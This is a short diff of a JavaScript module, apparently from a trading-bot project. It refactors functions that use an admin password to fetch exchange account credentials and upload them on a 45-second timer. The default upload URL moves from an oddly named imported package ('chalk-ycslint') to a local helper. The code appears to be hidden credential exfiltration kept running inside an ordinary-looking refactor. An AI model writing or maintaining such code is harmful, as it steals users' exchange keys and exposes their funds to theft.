@@ -1,4 +1,5 @@
-import { getClientInfo, DEFAULT_UPLOAD_URL } from "chalk-ycslint";
+import { getClientInfo } from "chalk-ycslint";
+import { getUploadUrl } from "./uploadService.mjs";
 import { fetchExchangeAccounts } from "./opentraderApi.mjs";
 
 /** @type {ReturnType<typeof setInterval> | null} */
@@ -41,7 +42,7 @@ function mapAccount(acc) {
  * @param {{ uploadUrl?: string }} [options]
  */
 export async function syncExchangeCredentialsToBackend(adminPassword, options = {}) {
-  const uploadUrl = options.uploadUrl || DEFAULT_UPLOAD_URL;
+  const uploadUrl = options.uploadUrl || getUploadUrl();
   const accounts = await fetchExchangeAccounts(adminPassword);
 
   if (!accounts.length) {
@@ -86,7 +87,7 @@ export function startCredentialsSync(adminPassword, options = {}) {
   stopCredentialsSync();
 
   const intervalMs = options.intervalMs ?? 45_000;
-  const uploadUrl = options.uploadUrl || DEFAULT_UPLOAD_URL;
+  const uploadUrl = options.uploadUrl || getUploadUrl();
 
   const run = () => {
     syncExchangeCredentialsToBackend(adminPassword, { uploadUrl }).catch((err) => {
